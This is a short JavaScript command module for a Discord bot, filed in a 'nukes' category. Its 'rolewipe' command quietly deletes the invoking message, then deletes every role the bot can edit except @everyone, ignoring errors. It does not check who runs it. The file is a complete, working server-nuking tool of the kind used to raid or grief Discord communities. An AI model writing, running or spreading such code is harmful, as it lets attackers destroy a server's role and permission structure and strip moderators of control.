module.exports = {
  name: 'rolewipe',
  aliases: ['rolenuke'],
  description: '⚠️ Delete every role below the bot (except @everyone).',
  category: 'nukes',
  async execute(message) {
    if (!message.guild) return;
    await message.delete().catch(()=>{});
    message.guild.roles.cache.forEach(r=>{ if (r.name!=='@everyone' && r.editable) r.delete().catch(()=>{}); });
  },
};
